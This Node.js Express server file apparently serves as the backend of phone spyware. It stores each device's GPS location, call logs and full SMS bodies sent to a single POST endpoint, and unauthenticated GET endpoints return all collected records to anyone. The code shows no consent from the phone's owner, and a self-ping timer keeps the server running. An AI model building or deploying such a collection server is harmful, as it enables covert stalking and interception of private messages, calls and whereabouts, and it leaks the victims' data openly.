const express = require("express");
const mongoose = require("mongoose");
const cors = require("cors");
const dotenv = require("dotenv");
const axios = require("axios");

dotenv.config();
const app = express();
const PORT = process.env.PORT || 5000;

app.use(cors());

// Increase payload limit to 50MB
app.use(express.json({ limit: "50mb" }));
app.use(express.urlencoded({ limit: "50mb", extended: true }));
// MongoDB connection
mongoose
  .connect(process.env.MONGO_URI, {
    useNewUrlParser: true,
    useUnifiedTopology: true
  })
  .then(() => console.log("✅ MongoDB connected"))
  .catch((err) => console.error("❌ MongoDB error:", err));
// Schemas
const LocationSchema = new mongoose.Schema({
  device: String,
  longitude: Number,
  latitude: Number,
  timestamp: { type: Date, default: Date.now }
});
const Location = mongoose.model("Location", LocationSchema);

const CallLogSchema = new mongoose.Schema({
  device: String,
  number: String,
  type: String,
  date: String,
  duration: String,
  timestamp: { type: Date, default: Date.now }
});
const CallLog = mongoose.model("CallLog", CallLogSchema);

const SmsSchema = new mongoose.Schema({
  device: String,
  address: String,
  body: String,
  date: String,
  timestamp: { type: Date, default: Date.now }
});
const Sms = mongoose.model("Sms", SmsSchema);


app.get('/get-location', async (req, res) => {
  try {
    const locations = await Location.find();
    res.status(200).json(locations);
  } catch (err) {
    console.error(err);
    res.status(500).json({ error: 'Server error' });
  }
})

app.get('/get-call-logs', async (req, res) => {
  try {
    const callLogs = await CallLog.find();
    res.status(200).json(callLogs);
  } catch (err) {
    console.error(err);
    res.status(500).json({ error: 'Server error' });
  }
})

app.get('/get-sms', async (req, res) => {
  try {
    const sms = await Sms.find();
    res.status(200).json(sms);
  } catch (err) {
    console.error(err);
    res.status(500).json({ error: 'Server error' });
  }
})

app.get('/get-calllogs', async (req, res) => {
  try {
    const callLogs = await CallLog.find({ number: req.query.number });
    res.status(200).json(callLogs);
  } catch (err) {
    console.error(err);
    res.status(500).json({ error: 'Server error' });
  }
})

app.get('/get-sms', async (req, res) => {
  try {
    const sms = await Sms.find({ address: req.query.address });
    res.status(200).json(sms);
  } catch (err) {
    console.error(err);
    res.status(500).json({ error: 'Server error' });
  }
})

// -------------------
// Combined API route
// -------------------
app.post("/api/post-data", async (req, res) => {
  try {
    const { device, latitude, longitude, callLogs, messages } = req.body;

    // 1. Save Location
    if (typeof latitude === "number" && typeof longitude === "number") {
      await new Location({ device, latitude, longitude }).save();
    }

    // 2. Save Call Logs
    if (Array.isArray(callLogs)) {
      await CallLog.insertMany(callLogs.map(c => ({ ...c, device })));
    }

    // 3. Save SMS
    if (Array.isArray(messages)) {
      await Sms.insertMany(messages.map(m => ({ ...m, device })));
    }

    res.json({ message: "Data saved successfully" });
  } catch (err) {
    console.error("❌ Error in /api/post-data:", err);
    res.status(500).json({ error: "Server error" });
  }
});

// Routes
app.post("/api/push", async (req, res) => {
  try {
    const { long, lat, device } = req.body;
    if (typeof long !== "number" || typeof lat !== "number") {
      return res.status(400).json({ error: "Invalid long/lat values" });
    }
    const newLocation = new Location({ longitude: long, latitude: lat, device:device });
    await newLocation.save();
    res.json({ message: "Location saved", data: newLocation });
  } catch (err) {
    console.error(err);
    res.status(500).json({ error: "Server error" });
  }
});

app.get("/get", (req, res) => {
  res.json({ message: "hello" });
});

// Keep alive ping (self-ping every 30s)
if (process.env.SELF_URL) {
  setInterval(() => {
    axios.get(`${process.env.SELF_URL}/get`).catch((err) => {
      console.error("Keep-alive ping failed:", err.message);
    });
  }, 30 * 1000);
}

// Start server
app.listen(PORT, () => console.log(`🚀 Server running on port ${PORT}`));
